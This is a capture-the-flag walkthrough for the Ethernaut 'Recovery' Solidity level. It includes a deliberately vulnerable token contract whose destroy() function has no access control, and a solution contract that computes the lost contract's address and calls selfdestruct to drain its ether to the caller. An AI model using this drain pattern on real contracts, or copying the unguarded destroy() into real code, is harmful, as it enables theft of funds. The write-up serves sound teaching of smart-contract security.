# Recovery

## Challenge Description

A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent `0.001` ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the `0.001` ether from the lost contract address.

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint) public balances;

    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    function transfer(address _to, uint _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

## Challenge Solution Walkthrough

To solve the challenge:

1. First, we need to calculate the address of the lost contract using the provided formula. The formula is based on the Ethereum Yellow Paper and involves the deterministic calculation of an address using the sender's address and the account nonce. In this case, we assume the nonce is 1 since it's the first contract deployed from the current contract.

```
solidityCopy codeaddress lostContractAddress = address(
    uint160(
        uint256(
            keccak256(
                abi.encodePacked(
                    bytes1(0xd6),
                    bytes1(0x94),
                    creator,
                    bytes1(0x01)
                )
            )
        )
    )
);
```

The formula takes the rightmost 160 bits of the Keccak hash of the RLP encoding of the structure containing the sender's address (`creator`) and the account nonce.

2. Next, we deploy the `RecoverySolution` contract, which will help us calculate the address and destroy the lost contract. The `RecoverySolution` contract requires the `creator` address as a parameter in its constructor.

```
contract RecoverySolution {
    SimpleToken public simpleToken;
    address public creator;

    constructor(address creatorAddress) {
        creator = creatorAddress;
    }

    function getLostContractAddress() public view returns (address) {
        return
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xd6),
                                bytes1(0x94),
                                creator,
                                bytes1(0x01)
                            )
                        )
                    )
                )
            );
    }

    function solveChallenge() public {
        address lostContractAddress = getLostContractAddress();
        simpleToken = SimpleToken(payable(lostContractAddress));
        simpleToken.destroy(payable(msg.sender));
    }
}
```

3. Within the `solveChallenge()` function of the `RecoverySolution` contract, we perform the following steps:

- We assign the calculated `lostContractAddress` to the `simpleToken` variable, assuming it represents the `SimpleToken` contract we want to recover the funds from.

```
simpleToken = SimpleToken(payable(lostContractAddress));
```

- We then call the `destroy()` function of the `SimpleToken` contract and pass our own address (`msg.sender`) as the recipient of the remaining funds.

```
simpleToken.destroy(payable(msg.sender));
```

4. Finally, we call the `solveChallenge()` function in the deployed `RecoverySolution` contract. This triggers the calculation of the lost contract's address and the destruction of the contract, transferring the remaining funds to our account.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

Contract addresses are deterministic and are calculated by `keccak256(address, nonce)` where the `address` is the address of the contract (or ethereum address that created the transaction) and `nonce` is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).

Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.

An interesting [blog post](https://swende.se/blog/Ethereum_quirks_and_vulns.html) by Martin Swende details potential use cases of this.

If you're going to implement this technique, make sure you don't miss the nonce, or your funds will be lost forever.
